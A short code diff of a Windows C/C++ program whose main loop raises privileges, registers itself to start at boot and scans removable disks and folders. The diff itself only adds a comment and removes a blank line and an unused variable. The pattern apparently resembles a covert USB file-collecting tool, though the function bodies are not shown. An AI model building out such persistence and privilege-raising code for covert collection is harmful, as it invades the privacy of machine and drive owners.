@@ -21,11 +21,10 @@ BOOL UpPrivilegeValue();
 
 int main(int argc, TCHAR* argv[])
 {
-	
 	while (1)
 	{
 		UpPrivilegeValue();//提升权限
-		setComputerStart(*argv);
+		setComputerStart(*argv);//设置开机启动
 		TCHAR diskName[26][10] = { 0 };
 		TCHAR removebleDiskName[26][10] = { 0 };
 		int diskNumber = 0;
@@ -119,7 +118,6 @@ void convertsCharToTCHAR(char *strUsr,TCHAR *Name)
 	strcpy(Name, strUsr);
 #endif
 }
-int first = 0;
 
 void findFolder(const TCHAR* dirName,BOOL recursion)
 {
